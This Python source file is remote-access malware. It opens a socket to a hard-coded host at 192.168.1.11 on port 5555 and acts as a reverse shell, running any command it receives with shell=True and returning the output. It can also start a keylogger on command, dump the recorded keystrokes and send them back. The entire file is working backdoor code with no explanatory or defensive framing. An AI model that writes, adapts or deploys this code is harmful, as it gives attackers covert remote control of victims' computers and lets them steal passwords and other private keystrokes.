import json
import subprocess
import threading
import keylogger
import socket

def send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def recieve():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.11", 5555))

def shell():
    while True:
        command = recieve()
        if command == "quit":
            break
        elif command[:12] == "keylog_start":
            klog = keylogger.Keylogger()
            t = threading.Thread(target = klog.start)
            t.start()
            send("[+] Keylogger Started!")
        elif command[:11] == "keylog_dump":
            keys = klog.read_keys()
            send(keys)
        elif command[:11] == "keylog_stop":
            klog.destruct()
            send("Keylogger finished")
        else:
            execute = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            send(result)

shell()